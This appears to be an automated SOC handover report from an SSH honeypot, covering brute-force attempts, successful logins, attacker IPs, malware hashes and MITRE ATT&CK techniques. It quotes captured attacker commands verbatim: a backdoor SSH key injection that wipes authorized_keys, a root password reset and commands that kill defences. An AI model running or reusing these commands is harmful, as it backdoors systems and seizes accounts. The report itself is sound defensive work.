# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-22 |
| **Generated At** | 2026-03-22T10:25:37Z |
| **Shift Time** | 10:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **57** |
| Confirmed Threats | **48** |
| False Positives Filtered | **9** (15.8%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **8** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **53** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **31** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **27** |
| Unique Passwords | **28** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `config` | 2 |
| `angelica` | 1 |
| `live` | 1 |
| `postgres` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234` | 2 |
| `12345` | 2 |
| `password` | 2 |
| `123123123` | 1 |
| `angelica` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `123123123` | 1 |
| `angelica` | `angelica` | 1 |
| `live` | `live1234` | 1 |
| `root` | `Dg123456` | 1 |
| `config` | `12345678` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123123123` | `120.234.232.184` | 2026-03-22T08:32:44 |
| `root` | `Dg123456` | `114.219.157.97` | 2026-03-22T09:13:47 |
| `root` | `Passwd123` | `197.227.8.186` | 2026-03-22T10:08:34 |
| `root` | `3245gs5662d34` | `197.227.8.186` | 2026-03-22T10:08:38 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Ygj0ZHPFwugr"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `114.219.157.97`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.227.8.186`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **20** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS9829` | National Internet Backbone | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS7489` | HostUS | 1 | HIGH |
| `AS56046` | China Mobile communications corporation | 1 | HIGH |
| `AS29256` | STE PDN Internal AS | 1 | MEDIUM |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS46562` | Performive LLC | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8bb157b69e21

| Field | Detail |
|---|---|
| **Source IP** | `120.234.232[.]184` |
| **First Seen** | 2026-03-22 08:32 |
| **Last Seen** | 2026-03-22 08:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 08:32:40` | `cowrie.session.connect` |
| `2026-03-22 08:32:41` | `cowrie.client.version` |
| `2026-03-22 08:32:41` | `cowrie.client.kex` |
| `2026-03-22 08:32:44` | `cowrie.login.success` |
| `2026-03-22 08:32:45` | `cowrie.direct-tcpip.request` |
| `2026-03-22 08:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.232[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.234.232[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe915fd01f32

| Field | Detail |
|---|---|
| **Source IP** | `114.219.157[.]97` |
| **First Seen** | 2026-03-22 09:13 |
| **Last Seen** | 2026-03-22 09:14 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Ygj0ZHPFwugr"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 09:13:46` | `cowrie.session.connect` |
| `2026-03-22 09:13:46` | `cowrie.client.version` |
| `2026-03-22 09:13:46` | `cowrie.client.kex` |
| `2026-03-22 09:13:47` | `cowrie.login.success` |
| `2026-03-22 09:13:47` | `cowrie.session.params` |
| `2026-03-22 09:13:47` | `cowrie.command.input` |
| `2026-03-22 09:13:47` | `cowrie.command.failed` |
| `2026-03-22 09:13:47` | `cowrie.log.closed` |
| `2026-03-22 09:13:48` | `cowrie.session.params` |
| `2026-03-22 09:13:48` | `cowrie.command.input` |
| `2026-03-22 09:13:48` | `cowrie.session.file_download` |
| `2026-03-22 09:13:48` | `cowrie.log.closed` |
| `2026-03-22 09:14:00` | `cowrie.session.params` |
| `2026-03-22 09:14:00` | `cowrie.command.input` |
| `2026-03-22 09:14:00` | `cowrie.log.closed` |
| `2026-03-22 09:14:00` | `cowrie.session.params` |
| `2026-03-22 09:14:00` | `cowrie.command.input` |
| `2026-03-22 09:14:01` | `cowrie.log.closed` |
| `2026-03-22 09:14:01` | `cowrie.session.params` |
| `2026-03-22 09:14:01` | `cowrie.command.input` |
| `2026-03-22 09:14:01` | `cowrie.session.file_download` |
| `2026-03-22 09:14:01` | `cowrie.log.closed` |
| `2026-03-22 09:14:01` | `cowrie.session.params` |
| `2026-03-22 09:14:01` | `cowrie.command.input` |
| `2026-03-22 09:14:02` | `cowrie.log.closed` |
| `2026-03-22 09:14:02` | `cowrie.session.params` |
| `2026-03-22 09:14:02` | `cowrie.command.input` |
| `2026-03-22 09:14:02` | `cowrie.log.closed` |
| `2026-03-22 09:14:02` | `cowrie.session.params` |
| `2026-03-22 09:14:02` | `cowrie.command.input` |
| `2026-03-22 09:14:02` | `cowrie.command.input` |
| `2026-03-22 09:14:02` | `cowrie.log.closed` |
| `2026-03-22 09:14:03` | `cowrie.session.params` |
| `2026-03-22 09:14:03` | `cowrie.command.input` |
| `2026-03-22 09:14:03` | `cowrie.log.closed` |
| `2026-03-22 09:14:03` | `cowrie.session.params` |
| `2026-03-22 09:14:03` | `cowrie.command.input` |
| `2026-03-22 09:14:03` | `cowrie.log.closed` |
| `2026-03-22 09:14:04` | `cowrie.session.params` |
| `2026-03-22 09:14:04` | `cowrie.command.input` |
| `2026-03-22 09:14:04` | `cowrie.log.closed` |
| `2026-03-22 09:14:04` | `cowrie.session.params` |
| `2026-03-22 09:14:04` | `cowrie.command.input` |
| `2026-03-22 09:14:04` | `cowrie.log.closed` |
| `2026-03-22 09:14:05` | `cowrie.session.params` |
| `2026-03-22 09:14:05` | `cowrie.command.input` |
| `2026-03-22 09:14:05` | `cowrie.log.closed` |
| `2026-03-22 09:14:05` | `cowrie.session.params` |
| `2026-03-22 09:14:05` | `cowrie.command.input` |
| `2026-03-22 09:14:05` | `cowrie.log.closed` |
| `2026-03-22 09:14:06` | `cowrie.session.params` |
| `2026-03-22 09:14:06` | `cowrie.command.input` |
| `2026-03-22 09:14:06` | `cowrie.log.closed` |
| `2026-03-22 09:14:06` | `cowrie.session.params` |
| `2026-03-22 09:14:06` | `cowrie.command.input` |
| `2026-03-22 09:14:06` | `cowrie.log.closed` |
| `2026-03-22 09:14:07` | `cowrie.session.params` |
| `2026-03-22 09:14:07` | `cowrie.command.input` |
| `2026-03-22 09:14:07` | `cowrie.log.closed` |
| `2026-03-22 09:14:07` | `cowrie.session.params` |
| `2026-03-22 09:14:07` | `cowrie.command.input` |
| `2026-03-22 09:14:07` | `cowrie.log.closed` |
| `2026-03-22 09:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.219.157[.]97` to AbuseIPDB if not already reported
- [ ] Block `114.219.157[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0af9665fb71

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-03-22 10:08 |
| **Last Seen** | 2026-03-22 10:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 10:08:33` | `cowrie.session.connect` |
| `2026-03-22 10:08:33` | `cowrie.client.version` |
| `2026-03-22 10:08:33` | `cowrie.client.kex` |
| `2026-03-22 10:08:34` | `cowrie.login.success` |
| `2026-03-22 10:08:34` | `cowrie.session.params` |
| `2026-03-22 10:08:34` | `cowrie.command.input` |
| `2026-03-22 10:08:34` | `cowrie.command.failed` |
| `2026-03-22 10:08:34` | `cowrie.log.closed` |
| `2026-03-22 10:08:35` | `cowrie.session.params` |
| `2026-03-22 10:08:35` | `cowrie.command.input` |
| `2026-03-22 10:08:35` | `cowrie.session.file_download` |
| `2026-03-22 10:08:35` | `cowrie.log.closed` |
| `2026-03-22 10:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf38542b19ae

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-03-22 10:08 |
| **Last Seen** | 2026-03-22 10:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 10:08:37` | `cowrie.session.connect` |
| `2026-03-22 10:08:37` | `cowrie.client.version` |
| `2026-03-22 10:08:37` | `cowrie.client.kex` |
| `2026-03-22 10:08:38` | `cowrie.login.success` |
| `2026-03-22 10:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `197.227.8[.]186` | **15** | 2026-03-22 09:40 | 2026-03-22 10:08 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.219.157[.]97` | **10** | 2026-03-22 09:11 | 2026-03-22 09:17 | 18m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `59.98.148[.]5` | **2** | 2026-03-22 09:11 | 2026-03-22 09:16 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `111.26.95[.]122` | 1 | 2026-03-22 09:22 | 2026-03-22 09:22 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.102.48[.]29` | 1 | 2026-03-22 09:15 | 2026-03-22 09:16 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.132.249[.]164` | 1 | 2026-03-22 09:33 | 2026-03-22 09:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.31.124[.]21` | 1 | 2026-03-22 10:24 | 2026-03-22 10:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.240.237[.]18` | 1 | 2026-03-22 10:16 | 2026-03-22 10:16 | 13s | 0 | `T1592` | 🟢 LOW |
| `117.241.77[.]78` | 1 | 2026-03-22 09:32 | 2026-03-22 09:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `160.119.76[.]44` | 1 | 2026-03-22 09:58 | 2026-03-22 09:58 | 5s | 0 | `T1592` | 🟢 LOW |
| `178.150.135[.]19` | 1 | 2026-03-22 09:55 | 2026-03-22 09:56 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.16.53[.]51` | 1 | 2026-03-22 10:19 | 2026-03-22 10:20 | 31s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-03-22 10:12 | 2026-03-22 10:13 | 80s | 0 | `T1592` | 🟢 LOW |
| `182.150.115[.]56` | 1 | 2026-03-22 09:20 | 2026-03-22 09:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.154.134[.]146` | 1 | 2026-03-22 10:22 | 2026-03-22 10:22 | 4s | 0 | `T1592` | 🟢 LOW |
| `43.245.143[.]215` | 1 | 2026-03-22 10:19 | 2026-03-22 10:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.120[.]132` | 1 | 2026-03-22 10:01 | 2026-03-22 10:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.207.15[.]25` | 1 | 2026-03-22 09:35 | 2026-03-22 09:35 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `69.112.28[.]181` | 1 | 2026-03-22 09:42 | 2026-03-22 09:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.252.238[.]55` | 1 | 2026-03-22 08:38 | 2026-03-22 08:38 | 14s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `69.112.28[.]181` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 33 |
| `36.154.134[.]146` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `160.119.76[.]44` | NL | HostUS Solutions LLC | **100** ⚠️ | 4 |
| `111.26.95[.]122` | CN | China Mobile Communications Corporation | **100** ⚠️ | 16 |
| `178.16.53[.]51` | NL | OMEGATECH | **100** ⚠️ | 5 |
| `49.207.15[.]25` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 41 |
| `47.251.120[.]132` | US | Alibaba Cloud - US | **100** ⚠️ | 4 |
| `117.241.77[.]78` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 16 |
| `117.240.237[.]18` | IN | NIB (National Internet Backbone) | **100** ⚠️ | 22 |
| `178.150.135[.]19` | UA | CONTENT DELIVERY NETWORK LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 43 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 27 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 6 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 57 cases |
| Tool 34  | Credential Extractor        | ✅ 31 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (15.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 20 recon entry/entries in table (3 group(s) consolidating 27 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-22T10:25:37Z_
